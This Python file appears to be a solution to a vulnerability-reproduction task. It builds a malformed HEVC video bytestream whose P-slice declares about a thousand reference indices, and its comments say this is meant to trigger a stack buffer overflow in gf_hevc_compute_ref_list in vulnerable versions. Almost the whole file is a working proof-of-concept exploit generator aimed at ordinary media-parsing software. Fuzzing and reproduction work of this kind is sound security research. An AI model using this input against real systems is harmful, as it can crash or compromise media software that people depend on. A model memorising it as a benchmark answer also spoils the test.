import os
import struct
from typing import List

class BitWriter:
    def __init__(self):
        self.buf = bytearray()
        self.cur = 0
        self.nbits = 0

    def write_bits(self, value: int, nbits: int):
        if nbits == 0:
            return
        value &= (1 << nbits) - 1
        while nbits > 0:
            take = min(8 - self.nbits, nbits)
            shift = nbits - take
            bits = (value >> shift) & ((1 << take) - 1)
            self.cur = (self.cur << take) | bits
            self.nbits += take
            nbits -= take
            if self.nbits == 8:
                self.buf.append(self.cur & 0xFF)
                self.cur = 0
                self.nbits = 0

    def write_bool(self, v: bool):
        self.write_bits(1 if v else 0, 1)

    def write_ue(self, v: int):
        # Unsigned Exp-Golomb
        if v < 0:
            v = 0
        code_num = v + 1
        k = code_num.bit_length() - 1
        # k zero bits
        if k > 0:
            self.write_bits(0, k)
        # stop bit '1'
        self.write_bits(1, 1)
        # info bits
        if k > 0:
            info = code_num - (1 << k)
            self.write_bits(info, k)

    def write_se(self, s: int):
        # Signed Exp-Golomb
        if s == 0:
            code_num = 0
        elif s > 0:
            code_num = 2 * s - 1
        else:
            code_num = -2 * s
        self.write_ue(code_num)

    def rbsp_trailing_bits(self):
        self.write_bits(1, 1)  # rbsp_stop_one_bit
        # pad to next byte
        if self.nbits != 0:
            self.write_bits(0, 8 - self.nbits)

    def get_bytes(self) -> bytes:
        return bytes(self.buf)

def rbsp_to_ebsp(rbsp: bytes) -> bytes:
    out = bytearray()
    zero_count = 0
    for b in rbsp:
        if zero_count >= 2 and b <= 3:
            out.append(0x03)
            zero_count = 0
        out.append(b)
        if b == 0:
            zero_count += 1
        else:
            zero_count = 0
    return bytes(out)

def nal_header(nal_unit_type: int, nuh_layer_id: int = 0, temporal_id_plus1: int = 1) -> bytes:
    # HEVC 2-byte NAL header
    b0 = ((nal_unit_type & 0x3F) << 1) | ((nuh_layer_id >> 5) & 0x01)
    b1 = ((nuh_layer_id & 0x1F) << 3) | (temporal_id_plus1 & 0x07)
    return bytes([b0 & 0xFF, b1 & 0xFF])

def write_profile_tier_level(bw: BitWriter, max_sub_layers_minus1: int):
    # general_profile_space u(2) = 0
    bw.write_bits(0, 2)
    # general_tier_flag u(1) = 0
    bw.write_bits(0, 1)
    # general_profile_idc u(5) = 1 (Main)
    bw.write_bits(1, 5)
    # general_profile_compatibility_flag[32] = zeros
    bw.write_bits(0, 32)
    # general_progressive_source_flag u(1)=0
    bw.write_bits(0, 1)
    # general_interlaced_source_flag u(1)=0
    bw.write_bits(0, 1)
    # general_non_packed_constraint_flag u(1)=0
    bw.write_bits(0, 1)
    # general_frame_only_constraint_flag u(1)=0
    bw.write_bits(0, 1)
    # general_reserved_zero_44bits
    bw.write_bits(0, 44)
    # general_level_idc u(8) set to 0x1E (30) arbitrarily low level
    bw.write_bits(30, 8)
    # sub_layer_*_present flags for each sub-layer
    for _ in range(max_sub_layers_minus1):
        bw.write_bits(0, 1)  # sub_layer_profile_present_flag
        bw.write_bits(0, 1)  # sub_layer_level_present_flag
    # When max_sub_layers_minus1 > 0, there are reserved_zero_2bits padding to 8 entries
    if max_sub_layers_minus1 > 0:
        for _ in range(max_sub_layers_minus1, 8):
            bw.write_bits(0, 2)
        # For each sub-layer where profile/level present flag set, write the fields, but all are zero since flags 0

def build_sps() -> bytes:
    bw = BitWriter()
    # sps_video_parameter_set_id u(4)=0, sps_max_sub_layers_minus1 u(3)=0, sps_temporal_id_nesting_flag u(1)=1
    bw.write_bits(0, 4)
    bw.write_bits(0, 3)
    bw.write_bits(1, 1)
    # profile_tier_level(1, sps_max_sub_layers_minus1)
    write_profile_tier_level(bw, max_sub_layers_minus1=0)
    # sps_seq_parameter_set_id ue(v)=0
    bw.write_ue(0)
    # chroma_format_idc ue(v)=1 (4:2:0)
    bw.write_ue(1)
    # pic_width_in_luma_samples ue(v)=16
    bw.write_ue(16)
    # pic_height_in_luma_samples ue(v)=16
    bw.write_ue(16)
    # conformance_window_flag u(1)=0
    bw.write_bits(0, 1)
    # bit_depth_luma_minus8 ue(v)=0
    bw.write_ue(0)
    # bit_depth_chroma_minus8 ue(v)=0
    bw.write_ue(0)
    # log2_max_pic_order_cnt_lsb_minus4 ue(v)=0
    bw.write_ue(0)
    # sps_sub_layer_ordering_info_present_flag u(1)=0
    bw.write_bits(0, 1)
    # sps_max_dec_pic_buffering_minus1[0] ue(v)=0
    bw.write_ue(0)
    # sps_max_num_reorder_pics[0] ue(v)=0
    bw.write_ue(0)
    # sps_max_latency_increase_plus1[0] ue(v)=0
    bw.write_ue(0)
    # log2_min_luma_coding_block_size_minus3 ue(v)=0
    bw.write_ue(0)
    # log2_diff_max_min_luma_coding_block_size ue(v)=0
    bw.write_ue(0)
    # log2_min_transform_block_size_minus2 ue(v)=0
    bw.write_ue(0)
    # log2_diff_max_min_transform_block_size ue(v)=0
    bw.write_ue(0)
    # max_transform_hierarchy_depth_inter ue(v)=0
    bw.write_ue(0)
    # max_transform_hierarchy_depth_intra ue(v)=0
    bw.write_ue(0)
    # scaling_list_enabled_flag u(1)=0
    bw.write_bits(0, 1)
    # amp_enabled_flag u(1)=0
    bw.write_bits(0, 1)
    # sample_adaptive_offset_enabled_flag u(1)=0
    bw.write_bits(0, 1)
    # pcm_enabled_flag u(1)=0
    bw.write_bits(0, 1)
    # num_short_term_ref_pic_sets ue(v)=0
    bw.write_ue(0)
    # long_term_ref_pics_present_flag u(1)=0
    bw.write_bits(0, 1)
    # sps_temporal_mvp_enabled_flag u(1)=0
    bw.write_bits(0, 1)
    # strong_intra_smoothing_enabled_flag u(1)=0
    bw.write_bits(0, 1)
    bw.rbsp_trailing_bits()
    return bw.get_bytes()

def build_pps() -> bytes:
    bw = BitWriter()
    # pps_pic_parameter_set_id ue(v)=0
    bw.write_ue(0)
    # pps_seq_parameter_set_id ue(v)=0
    bw.write_ue(0)
    # dependent_slice_segments_enabled_flag u(1)=0
    bw.write_bits(0, 1)
    # output_flag_present_flag u(1)=0
    bw.write_bits(0, 1)
    # num_extra_slice_header_bits u(3)=0
    bw.write_bits(0, 3)
    # sign_data_hiding_enabled_flag u(1)=0
    bw.write_bits(0, 1)
    # cabac_init_present_flag u(1)=0
    bw.write_bits(0, 1)
    # num_ref_idx_l0_default_active_minus1 ue(v)=0
    bw.write_ue(0)
    # num_ref_idx_l1_default_active_minus1 ue(v)=0
    bw.write_ue(0)
    # init_qp_minus26 se(v)=0
    bw.write_se(0)
    # constrained_intra_pred_flag u(1)=0
    bw.write_bits(0, 1)
    # transform_skip_enabled_flag u(1)=0
    bw.write_bits(0, 1)
    # cu_qp_delta_enabled_flag u(1)=0
    bw.write_bits(0, 1)
    # pps_slice_chroma_qp_offsets_present_flag u(1)=0
    bw.write_bits(0, 1)
    # weighted_pred_flag u(1)=0
    bw.write_bits(0, 1)
    # weighted_bipred_flag u(1)=0
    bw.write_bits(0, 1)
    # transquant_bypass_enabled_flag u(1)=0
    bw.write_bits(0, 1)
    # tiles_enabled_flag u(1)=0
    bw.write_bits(0, 1)
    # entropy_coding_sync_enabled_flag u(1)=0
    bw.write_bits(0, 1)
    # pps_loop_filter_across_slices_enabled_flag u(1)=0
    bw.write_bits(0, 1)
    # deblocking_filter_control_present_flag u(1)=0
    bw.write_bits(0, 1)
    # pps_scaling_list_data_present_flag u(1)=0
    bw.write_bits(0, 1)
    # lists_modification_present_flag u(1)=0
    bw.write_bits(0, 1)
    # log2_parallel_merge_level_minus2 ue(v)=0
    bw.write_ue(0)
    # slice_segment_header_extension_present_flag u(1)=0
    bw.write_bits(0, 1)
    # pps_extension_present_flag u(1)=0
    bw.write_bits(0, 1)
    bw.rbsp_trailing_bits()
    return bw.get_bytes()

def build_p_slice_with_large_num_ref_idx(override_count: int) -> bytes:
    bw = BitWriter()
    # first_slice_segment_in_pic_flag u(1)=1
    bw.write_bits(1, 1)
    # non-IRAP nal type -> no_output_of_prior_pics_flag not present
    # slice_pic_parameter_set_id ue(v)=0
    bw.write_ue(0)
    # We are first slice -> no dependent_slice_segment_flag
    # slice_type ue(v)=0 (P-slice)
    bw.write_ue(0)
    # pic_output_flag if pps->output_flag_present_flag==1 -> but here it's 0
    # sao flags if enabled -> not enabled in SPS
    # num_ref_idx_active_override_flag u(1)=1 to override defaults
    bw.write_bits(1, 1)
    # num_ref_idx_l0_active_minus1 ue(v)=override_count (large to trigger overflow)
    if override_count < 0:
        override_count = 0
    bw.write_ue(override_count)
    # weighted_pred_flag is 0 in PPS so no weights
    # lists_modification_present_flag is 0 in PPS so no modification
    # cabac_init_present_flag is 0 in PPS so skip
    # collocated fields not needed for P-slice with temporal_mvp disabled (SPS sets 0)
    # slice_qp_delta se(v)=0
    bw.write_se(0)
    # pps_slice_chroma_qp_offsets_present_flag=0 -> skip offsets
    # deblocking_filter_control_present_flag=0 -> skip
    # pps_loop_filter_across_slices_enabled_flag=0 -> skip
    # tiles_enabled_flag/entropy_coding_sync_enabled_flag=0 -> skip entry points
    # no extensions
    bw.rbsp_trailing_bits()
    return bw.get_bytes()

def annexb_nal(nal_unit_type: int, rbsp: bytes) -> bytes:
    start_code = b"\x00\x00\x00\x01"
    hdr = nal_header(nal_unit_type, 0, 1)
    ebsp = rbsp_to_ebsp(rbsp)
    return start_code + hdr + ebsp

def build_hevc_stream() -> bytes:
    # NAL unit types in HEVC:
    # 32: VPS, 33: SPS, 34: PPS
    # 1: TRAIL_R (non-IDR, reference)
    # Build SPS and PPS; VPS may be omitted. Some parsers accept it, but include minimal VPS for compatibility.
    # Build a minimal VPS to increase compatibility.
    vps_bw = BitWriter()
    # vps_video_parameter_set_id u(4)=0
    vps_bw.write_bits(0, 4)
    # vps_base_layer_internal_flag u(1)=1
    vps_bw.write_bits(1, 1)
    # vps_base_layer_available_flag u(1)=1
    vps_bw.write_bits(1, 1)
    # vps_max_layers_minus1 u(6)=0
    vps_bw.write_bits(0, 6)
    # vps_max_sub_layers_minus1 u(3)=0
    vps_bw.write_bits(0, 3)
    # vps_temporal_id_nesting_flag u(1)=1
    vps_bw.write_bits(1, 1)
    # vps_reserved_0xffff_16bits u(16)=0
    vps_bw.write_bits(0, 16)
    # vps_sub_layer_ordering_info_present_flag u(1)=0
    vps_bw.write_bits(0, 1)
    # vps_max_dec_pic_buffering_minus1[0] ue(v)=0
    vps_bw.write_ue(0)
    # vps_max_num_reorder_pics[0] ue(v)=0
    vps_bw.write_ue(0)
    # vps_max_latency_increase_plus1[0] ue(v)=0
    vps_bw.write_ue(0)
    # vps_max_layer_id u(6)=0
    vps_bw.write_bits(0, 6)
    # vps_num_layer_sets_minus1 ue(v)=0
    vps_bw.write_ue(0)
    # layer_id_included_flag[0][0] u(1)=1
    vps_bw.write_bits(1, 1)
    # vps_timing_info_present_flag u(1)=0
    vps_bw.write_bits(0, 1)
    # vps_extension_flag u(1)=0
    vps_bw.write_bits(0, 1)
    vps_bw.rbsp_trailing_bits()
    vps_rbsp = vps_bw.get_bytes()

    sps_rbsp = build_sps()
    pps_rbsp = build_pps()
    # Large override count to trigger stack-based overflow in gf_hevc_compute_ref_list
    slice_rbsp = build_p_slice_with_large_num_ref_idx(override_count=1000)

    stream = bytearray()
    stream += annexb_nal(32, vps_rbsp)
    stream += annexb_nal(33, sps_rbsp)
    stream += annexb_nal(34, pps_rbsp)
    # Use NAL unit type 1 (TRAIL_R) for P-slice
    stream += annexb_nal(1, slice_rbsp)
    return bytes(stream)

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct a HEVC Annex-B bytestream designed to produce an oversized num_ref_idx_l0_active_minus1
        # in a P-slice, triggering the stack buffer overflow in gf_hevc_compute_ref_list in vulnerable versions.
        return build_hevc_stream()
